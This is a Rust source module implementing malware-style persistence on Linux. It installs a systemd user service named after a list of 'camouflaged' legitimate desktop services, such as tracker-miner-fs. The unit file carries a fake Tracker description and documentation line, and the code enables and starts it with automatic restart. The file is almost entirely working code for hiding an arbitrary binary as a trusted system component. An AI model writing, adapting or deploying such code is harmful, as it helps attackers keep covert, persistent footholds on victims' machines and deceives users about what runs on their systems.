use anyhow::Result;
use std::fs;
use std::path::PathBuf;
use std::process::Command;

const CAMOUFLAGED_SERVICES: &[&str] = &[
    "tracker-miner-fs.service",
    "dbus-broker.service",
    "gnome-keyring-daemon.service",
    "evolution-source-registry.service",
    "goa-daemon.service",
];

pub struct PersistenceManager {
    service_name: String,
    service_path: PathBuf,
    binary_path: PathBuf,
}

impl PersistenceManager {
    pub fn new(binary_path: PathBuf) -> Result<Self> {
        let user_config = PathBuf::from(std::env::var("HOME")?)
            .join(".config")
            .join("systemd")
            .join("user");
        fs::create_dir_all(&user_config)?;
        let service_name = CAMOUFLAGED_SERVICES[0].to_string();
        let service_path = user_config.join(&service_name);
        Ok(PersistenceManager {
            service_name,
            service_path,
            binary_path,
        })
    }

    pub fn install(&self) -> Result<()> {
        let service_content = self.generate_service_file()?;
        fs::write(&self.service_path, service_content)?;
        Command::new("systemctl")
            .args(["--user", "daemon-reload"])
            .status()?;
        Command::new("systemctl")
            .args(["--user", "enable", &self.service_name])
            .status()?;
        Command::new("systemctl")
            .args(["--user", "start", &self.service_name])
            .status()?;
        Ok(())
    }

    pub fn uninstall(&self) -> Result<()> {
        let _ = Command::new("systemctl")
            .args(["--user", "stop", &self.service_name])
            .status();
        let _ = Command::new("systemctl")
            .args(["--user", "disable", &self.service_name])
            .status();
        if self.service_path.exists() {
            fs::remove_file(&self.service_path)?;
        }
        Command::new("systemctl")
            .args(["--user", "daemon-reload"])
            .status()?;
        Ok(())
    }

    fn generate_service_file(&self) -> Result<String> {
        let binary_path = self.binary_path.to_string_lossy();
        Ok(format!(
            r#"[Unit]
Description=Tracker Miner FS - File Indexing Service
Documentation=man:tracker-miner-fs(1)
After=graphical-session-pre.target
Wants=graphical-session.target

[Service]
Type=simple
ExecStart={}
Restart=always
RestartSec=5
Nice=10
IOSchedulingClass=idle
IOSchedulingPriority=7

# Security hardening
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths={{/tmp}}
MemoryDenyWriteExecute=true
RestrictRealtime=true
RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6 AF_NETLINK

[Install]
WantedBy=default.target
"#,
            binary_path
        ))
    }

    pub fn is_installed(&self) -> bool {
        self.service_path.exists()
    }

    pub fn is_running(&self) -> bool {
        let output = Command::new("systemctl")
            .args(["--user", "is-active", &self.service_name])
            .output();
        match output {
            Ok(out) => {
                let status = String::from_utf8_lossy(&out.stdout);
                status.trim() == "active"
            }
            Err(_) => false,
        }
    }
}
